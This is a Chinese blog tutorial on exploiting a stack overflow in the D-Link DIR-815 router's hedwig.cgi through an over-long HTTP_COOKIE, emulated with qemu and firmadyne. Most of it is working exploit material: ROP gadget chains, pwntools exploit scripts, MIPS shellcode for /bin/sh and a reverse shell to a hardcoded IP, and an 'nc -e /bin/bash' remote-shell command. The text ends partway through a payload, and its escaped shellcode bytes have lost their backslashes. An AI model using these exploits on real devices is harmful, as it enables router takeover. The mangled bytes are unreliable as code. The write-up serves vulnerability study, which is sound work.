> 原文链接: https://www.anquanke.com//post/id/187443 


# IOT设备漏洞挖掘从入门到入门（二）- DLink Dir 815漏洞分析及三种方式模拟复现


                                阅读量   
                                **627261**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">7</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t0181457581e80e80f0.jpg)](https://p2.ssl.qhimg.com/t0181457581e80e80f0.jpg)



最近在看各种关于路由器的环境模拟，漏洞复现的文章及《家用路由器0Day技术》，现在选择一个Dlink-dir-815进行分析，并且用三种方式对漏洞利用进行复现，分别是qemu-uset模式，qemu-system模式，以及firmadyne，希望对大家能有帮助。



## 环境准备

主要的环境准备参见[上一篇文章](https://www.anquanke.com/post/id/184718)，这里介绍本篇文章中会用的的模拟工具以及另一个静态分析工具。

### <a class="reference-link" name="ghidra"></a>ghidra

[下载地址](https://ghidra-sre.org)<br>[github地址](https://github.com/NationalSecurityAgency/ghidra)<br>[看雪平台大神](https://pan.baidu.com/s/1zx2yIHlPfCjP-R6Piq5spg) 提取码：tppr

### <a class="reference-link" name="Firmadyne"></a>Firmadyne

```
git clone --recursive https://github.com/attify/firmware-analysis-toolkit.git
cd ./firmware-analysis-toolkit/firmadyne
vi firmadyne.config
#将FIRMWARE_DIR=/home/vagrant/firmadynez这一行改为自己的firmadyne的目录路径
sudo ./download.sh
sudo -H pip install git+https://github.com/ahupp/python-magic
sudo -H pip install git+https://github.com/sviehb/jefferson
##下面为配置PostgreSQL数据库，提示输入密码的时候，输入firmadyne
sudo apt-get install qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
sudo apt-get install postgresql
sudo -u postgres createuser -P firmadyne
sudo -u postgres createdb -O firmadyne firmware
sudo -u postgres psql -d firmware &lt; ./firmadyne/database/schema
##
cp ../fat.py ./
cp ../reset.py ./
vi fat.py
##firmadyne_path = "/home/iot/source/firmware-analysis-toolkit/firmadyne"
##root_pass = "......"
##firmadyne_pass = "firmadyne"
##将firmadyne的路径以及root的密码修改一下
sudo service postgresql start
#接下来就是模拟运行了
```

详细的内容请参见[网址](https://www.freebuf.com/column/169425.html)

### <a class="reference-link" name="nmap"></a>nmap

```
svn co https://svn.nmap.org/nmap
cd nmap
./configure
make
sudo make install
```



## 固件下载

首先是固件下载，下载的[地址](https://tsd.dlink.com.tw/downloads2008detail.asp)，在这里，我选择的是`dir815_v1.00_a86b.bin`



## 查看设备指令架构

```
cd _dir815_v1.00_a86b.bin.extracted/squashfs-root/bin
file busybox
```

可以看到，指令集架构是mips小端



## 多重栈溢出漏洞

关于这个漏洞的话，在《家用路由器0day》这本书中已经详细的进行了介绍，接下来主要的重点放在漏洞分析，环境模拟，exp编写上面，因为这些内容在我调试的过程中困扰着我。

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

根据之前的漏洞分析，是和`HTTP_COOKIE`有关，我们用分别用IDA和ghidra打开cgibin这个文件，在string中进行搜索`HTTP_COOKIE`，可以找到有一个函数，就是`sess_get_uid`，分析一下这个函数，就是提取`HTTP_COOKIE`里面的`uid=`后面的部分，然后看一下交叉引用，找到了`hedwigcgi`这个`main`函数中，我们可以知道就是后面的`sprintf`函数引起了栈溢出，但是这个仔细看后面的代码，可以知道，后面还有一个`sprintf`函数，第四个参数同样是`HTTP_COOKIE`中`uid=`后面的内容，所以我们可以得出结论，这块也就是这个漏洞的漏洞点。如下面两张图所示：

[![](https://p1.ssl.qhimg.com/t01ea98c599721088e6.png)](https://p1.ssl.qhimg.com/t01ea98c599721088e6.png)

[![](https://p3.ssl.qhimg.com/t01c0852f29f4625072.png)](https://p3.ssl.qhimg.com/t01c0852f29f4625072.png)

但是具体是哪一个呢？我们看代码可以知道，后面回去读`/var/tmp/temp.xml`，如果有的话，就会继续往下执行，如果没有的话，就跳转到`0x409a64`，然后就是结束。所以也就是判断一下路由器中有没有`/var/tmp` ,具体方法详见《家用路由器0day漏洞挖掘技术》。最终的结论是第二个`sprintf`引起的栈溢出漏洞。

### <a class="reference-link" name="%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%B9%B6%E8%B0%83%E8%AF%95"></a>固件模拟并调试

这一部分是我想介绍，并花费了很长时间摸索的内容，因为没有路由器实体目标，所以需要通过模拟的方式来启动，这里要介绍模拟调试的三种方式，分别是`qemu-user`模式，`qemu-system`模式，`firmadyne`，最后一种方式目前只能通过显示来调试其中的偏移。

#### <a class="reference-link" name="qemu-user%E6%A8%A1%E5%BC%8F%E6%9C%AC%E5%9C%B0%E6%A8%A1%E6%8B%9F"></a>qemu-user模式本地模拟

##### <a class="reference-link" name="%E8%B0%83%E8%AF%95%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC"></a>调试启动脚本

首先是编写启动脚本，gedit local.sh，内容如下：

```
#!/bin/sh
INPUT="uid=1234"
TEST="uid=1234`cat content`"
LEN=$(echo -n "INPUT" |wc -c)
PORT="1234"
cp $(which qemu-mipsel-static) ./qemu
echo $INPUT | chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$TEST -E REQUEST_URI="/hedwig.cgi" -g $PORT /htdocs/web/hedwig.cgi
rm -f ./qemu
```

这个调试启动脚本与之前习题的启动脚本，不一样的地方是添加了`-E`，这个是用来添加环境变量的。因为在`cgibin`这个程序中，我们可以看到有很多地方都运用了`getenv`这个函数，它的作用就是用来获取环境变量的值，因为很多例如`HTTP_COOKIE`的取值，就是同这个方式，根据程序分析而来，我们需要设置如上的这些环境变量。（这些环境变量就是报文头部中请求的部分内容）。

##### <a class="reference-link" name="%E6%B5%8B%E8%AF%95%E5%81%8F%E7%A7%BB%E9%87%8F"></a>测试偏移量

在启动之前，还有一个事情就是要生成`content`数据，我们还是像上一篇一样，先用`patternLocOffset.py`去生成测试偏移的`content`，并最终得到偏移为1039。<br>
具体的流程是：

```
python patternLocOffset.py -c -l 2000 -f content
sudo ./local.sh
gdb-multiarch htdocs/cgibin
#这里调试htdocs/cgibin，是因为hedwig.cgi是一个链接文件，他的
```

##### <a class="reference-link" name="%E6%9C%AC%E5%9C%B0%E6%A8%A1%E6%8B%9F%E7%9A%84exp"></a>本地模拟的exp

接下来就是写`content`的生成脚本，也就是本地模拟的exp，因为程序最后即将返回的时候可以设置很多寄存器的值，所以我们也就省去了先调用`scandir`的那一段gadget了。最后的内容如下所示：

```
.text:00409A28                 lw      $ra, 0x4E8+var_4($sp)
.text:00409A2C                 move    $v0, $s7
.text:00409A30                 lw      $fp, 0x4E8+var_8($sp)
.text:00409A34                 lw      $s7, 0x4E8+var_C($sp)
.text:00409A38                 lw      $s6, 0x4E8+var_10($sp)
.text:00409A3C                 lw      $s5, 0x4E8+var_14($sp)
.text:00409A40                 lw      $s4, 0x4E8+var_18($sp)
.text:00409A44                 lw      $s3, 0x4E8+var_1C($sp)
.text:00409A48                 lw      $s2, 0x4E8+var_20($sp)
.text:00409A4C                 lw      $s1, 0x4E8+var_24($sp)
.text:00409A50                 lw      $s0, 0x4E8+var_28($sp)
.text:00409A54                 jr      $ra
.text:00409A58                 addiu   $sp, 0x4E8
```

所以我们的通用的一个脚本如下content.py：

```
from pwn import *
context.arch = 'mips'
context.endian = 'little'
data = "a"*1003
data += "aaaa" #s0
data += "bbbb" #s1
data += "cccc" #s2
data += "dddd" #s3
data += "eeee" #s4
data += "ffff" #s5
data += "gggg" #s6
data += "hhhh" #s7
data += "iiii" #gp
data += "jjjj" #ra
f=open("content","wb")
f.write(data)
f.close()
```

在相应寄存器的位置填入我们的gadget，接下来，我将用两种方式来编写我们的exp。

一:采用《0day》这本书中的方式，调用system函数，然后通过rop填入参数即可。这个里面有一个技巧就是`system`的地址为`0x53200`，出现了`x00`字符，所以我们采用书上的先对这个地址减一，也就是我们传入一个减一的值，后面调用gadget对这个值加一，并且将寄存器`a0`的值弄成我们想要执行的命令就可以。

1.寻找gadget。

在这里，我们将`lib/libuClibc-0.9.30.1.so`放入IDA中来寻找gadget，因为`libc.so.0`是他的链接。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t017d47993ddd231775.png)

接下来，显示寻找“+1”的gadget，通过`mipsrop.find("addiu $s0,1")`,找到第一个gadget

```
----------------------------------------------------------------------------------------------------------------
|  Address     |  Action                                              |  Control Jump                          |
----------------------------------------------------------------------------------------------------------------
|  0x000158C8  |  addiu $s0,1                                         |  jalr  $s5                             |
```

然后我们看一下`0x158c8`处的代码，如下：

```
.text:000158C8                 move    $t9, $s5
.text:000158CC                 jalr    $t9
.text:000158D0                 addiu   $s0, 1
```

是通过寄存器`$s5`来进行下一个跳转的，加下来就是找一个设置寄存器`$a0`的gadget，也就是通过这个gadget来设置`system`的参数。我们通过`mipsrop.stackfinder()`来找一个。

```
|  0x000159CC  |  addiu $s5,$sp,0x170+var_160                         |  jalr  $s0                             |
```

我们看一下这个地址的汇编代码：

```
.text:000159CC                 addiu   $s5, $sp, 0x170+var_160
.text:000159D0                 move    $a1, $s3
.text:000159D4                 move    $a2, $s1
.text:000159D8                 move    $t9, $s0
.text:000159DC                 jalr    $t9 ; mempcpy
.text:000159E0                 move    $a0, $s5
```

这个地方是通过寄存器`$s0`来进行下一个跳转的，和我们最开始找的那个“+1”gadget所对应的寄存器是同一个。

2.编写exp

所以我们最终的exp模版如下所示：

```
from pwn import *
context.arch = 'mips'
context.endian = 'little'
libc_base = 0x76738000
system_offset = 0x53200-1
gadget1 = 0x159cc
gadget2 = 0x158C8
#cmd = "nc -e /bin/bash 192.168.100.254 9999"
cmd = "/bin/sh"
data = "a"*1003
data += p32(libc_base+system_offset) #s0
data += "bbbb" #s1
data += "cccc" #s2
data += "dddd" #s3
data += "eeee" #s4
data += p32(libc_base+gadget1) #s5
data += "ffff" #s6
data += "gggg" #s7
data += "aaaa" #gp
data += p32(libc_base+gadget2) #ra
data += "b"*0x10
data += cmd
f=open("content","wb")
f.write(data)
f.close()
```

我们只要在cmd的位置填上我们想要其执行的指令就可以啦。这个里面还有一个`libc_base`的基地址，我们还是通过上一篇介绍的，也就是用gdb调试的时候，用`vmmap`查看的。过程如下：

```
gdb-multiarch htdocs/cgibin
target remote 127.0.0.1:1234
b *0x409A54
c
vmmap
```

这样，我们就能得到libc的基地址。

3.测试

用user模式进行测试的时候，总是没有成功，不知道原因，如图所示，总是直接跳转到原来`$ra`的位置继续执行，然而寄存器`$fp`的值又发生变化啦，所以就出错啦.

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0166e7a6ed932e8899.png)

后来在跟着调试过程中，发现下面的代码：

```
.text:0005327C                 la      $t9, fork
.text:00053280                 jalr    $t9 ; fork
.text:00053284                 move    $s4, $v0
.text:00053288                 bgez    $v0, loc_532CC
.text:0005328C                 move    $s0, $v0
.text:00053290                 move    $a1, $s2
.text:00053294                 move    $t9, $s1
.text:00053298                 jalr    $t9 ; signal
.text:0005329C                 li      $a0, 3
.text:000532A0                 move    $a1, $s3
.text:000532A4                 move    $t9, $s1
.text:000532A8                 jalr    $t9 ; signal
.text:000532AC                 li      $a0, 2
.text:000532B0                 move    $a1, $s4
.text:000532B4                 move    $t9, $s1
.text:000532B8                 jalr    $t9 ; signal
.text:000532BC                 li      $a0, 0x12
.text:000532C0                 lw      $gp, 0x48+var_30($sp)
.text:000532C4                 b       loc_533C4
.text:000532C8                 li      $v0, 0xFFFFFFFF
.text:000532CC  #     ---------------------------------------------------------------------------
.text:000532CC
.text:000532CC loc_532CC:                               # CODE XREF: system+88↑j
.text:000532CC                 bnez    $v0, loc_5333C
.text:000532D0                 li      $a0, 3
.text:000532D4                 move    $t9, $s1
.text:000532D8                 jalr    $t9 ; signal
.text:000532DC                 move    $a1, $zero
.text:000532E0                 li      $a0, 2
.text:000532E4                 move    $t9, $s1
.text:000532E8                 jalr    $t9 ; signal
.text:000532EC                 move    $a1, $zero
.text:000532F0                 li      $a0, 0x12
.text:000532F4                 move    $t9, $s1
.text:000532F8                 jalr    $t9 ; signal
.text:000532FC                 move    $a1, $zero
.text:00053300                 lw      $gp, 0x48+var_30($sp)
.text:00053304                 move    $a3, $s5
.text:00053308                 li      $a0, 0x60000
.text:0005330C                 li      $a1, 0x60000
.text:00053310                 li      $a2, 0x60000
.text:00053314                 la      $t9, execl
.text:00053318                 addiu   $a0, (aBinSh - 0x60000)  # "/bin/sh"
```

他是先fork了一个子进程，在子进程中执行命令，然而通过user模式模拟的时候，无法实现。所以我就想了第二个方式，运用<a>上一篇文章</a>的内容，也就是跳转直行shellcode的方式去执行。

二.执行shellcode

1.寻找gadget

我们分别用`mipsrop.find("li $a0,1")`,`mipsrop.tail()`,`mipsrop.stackfinder()`,`mipsrop.find("mov $t9,$a1")`来寻找我们的gadget，其实有很多组合，我选取了其中之一：

```
#gadget1
.text:00057E50                 li      $a0, 1
.text:00057E54                 move    $t9, $s1
.text:00057E58                 jalr    $t9 ; sub_57B50
.text:00057E5C                 ori     $a1, $s0, 2
#gadget2
.text:0003E524                 move    $t9, $s2
.text:0003E528                 lw      $ra, 0x28+var_4($sp)
.text:0003E52C                 lw      $s2, 0x28+var_8($sp)
.text:0003E530                 lw      $s1, 0x28+var_C($sp)
.text:0003E534                 lw      $s0, 0x28+var_10($sp)
.text:0003E538                 jr      $t9 ; xdr_opaque_auth
.text:0003E53C                 addiu   $sp, 0x28
#gadget3
.text:0000B814                 addiu   $a1, $sp, 0x168+var_150
.text:0000B818                 move    $t9, $s1
.text:0000B81C                 jalr    $t9 ; stat64
.text:0000B820                 addiu   $a0, (off_5C144 - 0x60000)
#gadget4
.text:00037E6C                 move    $t9, $a1
.text:00037E70                 addiu   $a0, 0x4C  # 'L'
.text:00037E74                 jr      $t9
.text:00037E78                 move    $a1, $a2
```

2.编写exp并测试验证<br>
我们最终编写的exp如下所示：

```
libc_base = 0x76738000
sleep_offset = 0x56BD0
gadget1 = 0x57E50   
gadget2 = 0x0003E524
gadget3 = 0x0000B814
gadget4 = 0x00037E6C
data = "a"*1003
data += "aaaa" #s0
data += p32(libc_base+gadget2) #s1
data += p32(libc_base+sleep_offset) #s2
data += "aaaa" #s3
data += "aaaa" #s4
data += "aaaa" #s5
data += "aaaa" #s6
data += "aaaa" #s7
data += "aaaa" #gp
data += p32(libc_base+gadget1) #ra
data += "b"*0x18
data += "bbbb" #s0
data += p32(libc_base+gadget4) #s1
data += "bbbb" #s2
data += p32(libc_base+gadget3) #ra
data += "c"*0x18
data += shellcode 
f=open("content","wb")
f.write(data)
f.close()
```

其中shellcode部分我们采用了上一篇文章中的执行`/bin/sh`的shellcode，如下：

```
payload = "x26x40x08x01"*2
payload += "xffxffx06x28"  # slti $a2, $zero, -1
payload += "x62x69x0fx3c"  # lui $t7, 0x6962
payload += "x2fx2fxefx35"  # ori $t7, $t7, 0x2f2f
payload += "xf4xffxafxaf"  # sw $t7, -0xc($sp)
payload += "x73x68x0ex3c"  # lui $t6, 0x6873
payload += "x6ex2fxcex35"  # ori $t6, $t6, 0x2f6e
payload += "xf8xffxaexaf"  # sw $t6, -8($sp)
payload += "xfcxffxa0xaf"  # sw $zero, -4($sp)
payload += "xf4xffxa4x27"  # addiu $a0, $sp, -0xc
payload += "xffxffx05x28"  # slti $a1, $zero, -1
payload += "xabx0fx02x24"  # addiu;$v0, $zero, 0xfab
payload += "x0cx01x01x01"  # syscall 0x40404
```

结果出现下面的情形：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0180d5ff79cf0083c9.png)

这个时候，我想起一个大神的[一篇文章](https://www.vantagepoint.sg/papers/MIPS-BOF-LyonYang-PUBLIC-FINAL.pdf)，上面采用的方式是先执行一个`fork`然后执行其他的shellcode，我尝试了这个方法，shellcode如下：

```
sc_fork = "x26x40x08x01"*2
sc_fork +="xffxffx11x24x0fx27x04x24x46x10x02x24x0cx01x01x01"
sc_fork+="x65x66xb9x87"
sc_fork+="x2dx10x11x24xa2x0fx02x24x0cx01x01x01xf8xffx40x1c"
payload = "xffxffx06x28"  # slti $a2, $zero, -1
payload += "x62x69x0fx3c"  # lui $t7, 0x6962
payload += "x2fx2fxefx35"  # ori $t7, $t7, 0x2f2f
payload += "xf4xffxafxaf"  # sw $t7, -0xc($sp)
payload += "x73x68x0ex3c"  # lui $t6, 0x6873
payload += "x6ex2fxcex35"  # ori $t6, $t6, 0x2f6e
payload += "xf8xffxaexaf"  # sw $t6, -8($sp)
payload += "xfcxffxa0xaf"  # sw $zero, -4($sp)
payload += "xf4xffxa4x27"  # addiu $a0, $sp, -0xc
payload += "xffxffx05x28"  # slti $a1, $zero, -1
payload += "xabx0fx02x24"  # addiu;$v0, $zero, 0xfab
payload += "x0cx01x01x01"  # syscall 0x40404
```

结果出现如下的情景：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01871d9cc3a0cdddd9.png)

此处的`illegal instruction`是我不能理解的，请各位大神帮忙解答一下。

然后我又尝试了反弹 shell的shellcode，shellcode如下：

```
payload = "x26x40x08x01"*4
payload += "xffxffx04x28xa6x0fx02x24x0cx09x09x01x11x11x04x28"
payload += "xa6x0fx02x24x0cx09x09x01xfdxffx0cx24x27x20x80x01"
payload += "xa6x0fx02x24x0cx09x09x01xfdxffx0cx24x27x20x80x01"
payload += "x27x28x80x01xffxffx06x28x57x10x02x24x0cx09x09x01"
payload += "xffxffx44x30xc9x0fx02x24x0cx09x09x01xc9x0fx02x24"
payload += "x0cx09x09x01x79x69x05x3cx01xffxa5x34x01x01xa5x20"
#payload += "xf8xffxa5xafx01xb1x05x3cxc0xa8xa5x34xfcxffxa5xaf"
# 192.168.1.177
payload += "xf8xffxa5xafx03x84x05x3cxc0xa8xa5x34xfcxffxa5xaf"
# 192.168.3.132
#payload += "xf8xffxa5xafx64xfex05x3cxc0xa8xa5x34xfcxffxa5xaf"
# 192.168.100.254
payload += "xf8xffxa5x23xefxffx0cx24x27x30x80x01x4ax10x02x24"
payload += "x0cx09x09x01x62x69x08x3cx2fx2fx08x35xecxffxa8xaf"
payload += "x73x68x08x3cx6ex2fx08x35xf0xffxa8xafxffxffx07x28"
payload += "xf4xffxa7xafxfcxffxa7xafxecxffxa4x23xecxffxa8x23"
payload += "xf8xffxa8xafxf8xffxa5x23xecxffxbdx27xffxffx06x28"
payload += "xabx0fx02x24x0cx09x09x01"
```

结果出现下面的情景：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0104b1f98cfc2cd657.png)

出现这个的原因，也不是很理解，还是请各位大佬帮忙解答一下。后面我就先归因于user mode模式下的问题。接下来，就要验证qemu-system下可不可以（如此繁琐的验证，就是因为没有真机啊，哭）

##### <a class="reference-link" name="qemu-system%E6%A8%A1%E5%BC%8F%E6%A8%A1%E6%8B%9F"></a>qemu-system模式模拟

首先是环境复原，这一步真的是耗费了好长时间啊，此前对于http server的理解不是很够，所以找了很多的文章来看，很感谢大佬的[文章](https://kirin-say.top/2019/02/23/Building-MIPS-Environment-for-Router-PWN/)，帮我解答了这个疑惑，现在在这边详细讲解一下，cgi文件处理数据的流程基本如下：

```
1.主Web程序监听端口-&gt;传送HTTP数据包-&gt;HTTP中headers等数据通过环境变量的方式传给cgi处理程序-&gt;cgi程序通过getenv获取数据并处理返回给主程序-&gt;向客户端返回响应数据
2.post的数据，可以通过流的方式传入，也就是类似于echo "uid=aaa"| /htdocs/web/hedwig.cgi
```

之前一直在想一个问题，这些环境变量啊，或者post的数据啊，能不能直接通过外部数据请求的方式，传入到要调试的程序中？好像是不行的，听了一个大佬看法，因为httpd开启服务的时候，如果外部的请求为这些cgi的话，那么就会新fork一个进程，听到这的话，我就明白已经用gdbserver加载的程序和外部请求加载的cgi不是一个，所以也就不能用这种方式了。所以在mips虚拟机上调试的流程如下：

```
1.部分还原httpd服务，使其能正常访问
2.设置环境变量，提前设置好cgibin的参数请求
3.gdbserver加载hedwig.cgi
4.gdb-multiarch在外面进行连接调试
```

下面我将从上面四个部分分别进行讲解，因为大佬文章中的固件是1.02，和1.00还有很多不同，所以将根据自身情况进行调整。<br>
一.还原httpd服务<br>
我们首先先找一下有哪些是和httpd服务有关的内容，因为httpd开启的时候，会有一个配置文件。

```
find -name "*http*"
```

然后出现了四个东西，如下：

看到其中的有一个cfg，然后打开这个php，可以看到这是一个生成httpd的配置文件的php文件，所以我们需要先根据这个东西直接改写一个cfg文件。

改写后的conf文件如下：

```
Umask 026
PIDFile /var/run/httpd.pid
LogGMT On
ErrorLog /log

Tuning
`{`
    NumConnections 15
    BufSize 12288
    InputBufSize 4096
    ScriptBufSize 4096
    NumHeaders 100
    Timeout 60
    ScriptTimeout 60
`}`

Control
`{`
    Types
    `{`
        text/html    `{` html htm `}`
        text/xml    `{` xml `}`
        text/plain    `{` txt `}`
        image/gif    `{` gif `}`
        image/jpeg    `{` jpg `}`
        text/css    `{` css `}`
        application/octet-stream `{` * `}`
    `}`
    Specials
    `{`
        Dump        `{` /dump `}`
        CGI            `{` cgi `}`
        Imagemap    `{` map `}`
        Redirect    `{` url `}`
    `}`
    External
    `{`
        /usr/sbin/phpcgi `{` php `}`
    `}`
`}`


Server
`{`
    ServerName "Linux, HTTP/1.1, "
    ServerId "1234"
    Family inet
    Interface eth0
    Address 192.168.100.3
    Port "80"
    Virtual
    `{`
        AnyHost
        Control
        `{`
            Alias /
            Location /htdocs/web
            IndexNames `{` index.php `}`
            External
            `{`
                /usr/sbin/phpcgi `{` router_info.xml `}`
                /usr/sbin/phpcgi `{` post_login.xml `}`
            `}`
        `}`
        Control
        `{`
            Alias /HNAP1
            Location /htdocs/HNAP1
            External
            `{`
                /usr/sbin/hnap `{` hnap `}`
            `}`
            IndexNames `{` index.hnap `}`
        `}`
    `}`
`}`
```

将这个文件改写完之后，我们就用之前的方式启动mipsel虚拟机（在运行之前，最好先备份一个文件系统，因为之后的操作会改变原本的mipsel的文件系统的内容）：

```
在mipsel文件夹下运行
./start.sh
./net.sh
#在虚拟机中运行
./net.sh
```

这样的话，mipsel虚拟机和本机网络就互通啦，然后我们将解压后的固件的文件系统拷贝到mipsel虚拟机中。接下来就是在虚拟机中运行的一些环境复原的东西啦，按照如下的步骤进行操作：

```
cd root/_dir815_v1.00_a86b.bin.extracted/squashfs-root
cp conf /
cp sbin/httpd /
cp -rf htdocs/ /
rm /etc/services
cp -rf etc/ /
cp lib/ld-uClibc-0.9.30.1.so  /lib/
cp lib/libcrypt-0.9.30.1.so  /lib/
cp lib/libc.so.0  /lib/   
cp lib/libgcc_s.so.1  /lib/
cp lib/ld-uClibc.so.0  /lib/         
cp lib/libcrypt.so.0  /lib/         
cp lib/libgcc_s.so  /lib/  
cp lib/libuClibc-0.9.30.1.so  /lib/
cd /
ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi
ln -s /htdocs/cgibin /usr/sbin/phpcgi
ln -s /htdocs/cgibin /usr/sbin/phpcgi
./httpd -f conf
```

然后我们在浏览器汇总访问，出现如下图所示内容，即为成功：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t013ffb2f46100eabfb.png)

我们可以将其写成一个固定的脚本，这样就可以方便执行啦。

二.设置环境变量

我们通过export的方式来设置环境变量，其中的`HTTP_COOKIE`部分，

```
export CONTENT_LENGTH="100"
export CONTENT_TYPE="application/x-www-form-urlencoded"
export HTTP_COOKIE="uid=1234`cat content1`"
export REQUEST_METHOD="POST"
export REQUEST_URI="/hedwig.cgi"
```

三.gdbserver加载hedwig.cgi

我们前面已经通过`ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi`，然后我们通过下面的指令进行gdb挂载。

```
echo "uid=1234"|./gdbserver.mipsle 192.168.100.254:6666 ./htdocs/web/hedwig.cgi
```

所以写了一个脚本，在mipsel虚拟机里面执行，方便gdbserver加载程序，脚本如下：

```
#!/bin/bash
export CONTENT_LENGTH="100"
export CONTENT_TYPE="application/x-www-form-urlencoded"
export HTTP_COOKIE="uid=1234`cat content1`"
export REQUEST_METHOD="POST"
export REQUEST_URI="/hedwig.cgi"
echo "uid=1234"|./gdbserver.mipsle 192.168.100.254:6666 ./htdocs/web/hedwig.cgi
unset CONTENT_LENGTH
unset CONTENT_TYPE
unset HTTP_COOKIE
unset REQUEST_METHOD
unset REQUEST_URI
```

四.gdb-multiarch在本地加载

```
gdb-multiarch
target remote 192.168.100.3:6666
```

五.编写exp

我们依然要经过确定偏移，控制rap，lib基地址，rop链的构造，shellcode的构造等过程。确定偏移的过程依然是之前那一套，然后将其拷贝到mipsel虚拟机里面。可以得知偏移为1005，基地址为0x77f34000。我们的exp仍然分为两个部分，第一个为用system执行命令，第二个为执行shellcode的exp。

1）我们首先来看第一个exp如下

```
from pwn import *
context.arch = 'mips'
context.endian = 'little'
libc_base = 0x77f34000
system_offset = 0x53200-1
gadget1 = 0x159cc
gadget2 = 0x158C8
cmd = "nc -e /bin/bash 192.168.100.254 9999"
data = "a"*969
data += p32(libc_base+system_offset) #s0
data += "bbbb" #s1
data += "cccc" #s2
data += "dddd" #s3
data += "eeee" #s4
data += p32(libc_base+gadget1) #s5
data += "ffff" #s6
data += "gggg" #s7
data += "aaaa" #gp
data += p32(libc_base+gadget2) #ra
data += "b"*0x10
data += cmd
f=open("content","wb")
f.write(data)
f.close()
```

这个exp的实现，首先是基于上面user的部分修改的，然后执行的指令的话，是根据mipsel虚拟机里面的指令来写的，实际的指令可以修改。我们可以看到里面的命令如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01f1a63f724a7d2a1a.png)

最后执行的结果如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01514b44f6b34e99d9.png)

2）我们接下来看第二个exp如下：

```
from pwn import *
context.arch = 'mips'
context.endian = 'little'
payload= "x26x40x08x01"*4
payload += "xffxffx04x28xa6x0fx02x24x0cx09x09x01x11x11x04x28"
payload += "xa6x0fx02x24x0cx09x09x01xfdxffx0cx24x27x20x80x01"
payload += "xa6x0fx02x24x0cx09x09x01xfdxffx0cx24x27x20x80x01"
payload += "x27x28x80x01xffxffx06x28x57x10x02x24x0cx09x09x01"
payload += "xffxffx44x30xc9x0fx02x24x0cx09x09x01xc9x0fx02x24"
payload += "x0cx09x09x01x79x69x05x3cx01xffxa5x34x01x01xa5x20"
#payload += "xf8xffxa5xafx01xb1x05x3cxc0xa8xa5x34xfcxffxa5xaf"              # 192.168.1.177
#payload += "xf8xffxa5xafx03x84x05x3cxc0xa8xa5x34xfcxffxa5xaf"               # 192.168.3.132
payload += "xf8xffxa5xafx64xfex05x3cxc0xa8xa5x34xfcxffxa5xaf"               # 192.168.100.254
payload += "xf8xffxa5x23xefxffx0cx24x27x30x80x01x4ax10x02x24"
payload += "x0cx09x09x01x62x69x08x3cx2fx2fx08x35xecxffxa8xaf"
payload += "x73x68x08x3cx6ex2fx08x35xf0xffxa8xafxffxffx07x28"
payload += "xf4xffxa7xafxfcxffxa7xafxecxffxa4x23xecxffxa8x23"
payload += "xf8xffxa8xafxf8xffxa5x23xecxffxbdx27xffxffx06x28"
